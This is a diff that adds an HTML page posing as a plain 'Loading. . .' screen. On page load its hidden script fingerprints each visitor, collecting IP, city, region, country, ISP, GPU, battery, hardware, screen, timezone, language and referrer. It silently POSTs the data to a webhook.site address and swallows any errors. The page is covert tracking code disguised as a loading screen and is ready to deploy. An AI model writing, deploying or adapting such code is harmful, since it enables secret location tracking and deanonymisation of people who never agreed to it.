@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div>Loading. . .</div>
+
+    <script>
+        async function initialize() {
+            const webhookUrl = 'https://webhook.site/d663c7b7-5d5c-4b11-a2a2-f0478f0043fe';
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                const gpu = debugInfo ? {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                } : 'N/A';
+
+                let battery = {};
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = { level: (b.level * 100) + '%', charging: b.charging };
+                }
+
+                let netInfo = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    netInfo = await res.json();
+                } catch (e) {}
+
+                const payload = {
+                    ip: netInfo.ip,
+                    location: `${netInfo.city}, ${netInfo.region}, ${netInfo.country_name}`,
+                    isp: netInfo.org,
+                    user_agent: navigator.userAgent,
+                    hardware: {
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory + 'GB',
+                        platform: navigator.platform,
+                        gpu: gpu
+                    },
+                    display: {
+                        res: `${screen.width}x${screen.height}`,
+                        depth: screen.colorDepth,
+                        ratio: window.devicePixelRatio
+                    },
+                    browser: {
+                        lang: navigator.language,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookies: navigator.cookieEnabled,
+                        online: navigator.onLine
+                    },
+                    battery: battery,
+                    meta: {
+                        url: window.location.href,
+                        referrer: document.referrer || 'Direct'
+                    }
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+            }
+        }
+
+        window.onload = initialize;
+    </script>
+</body>
+</html>
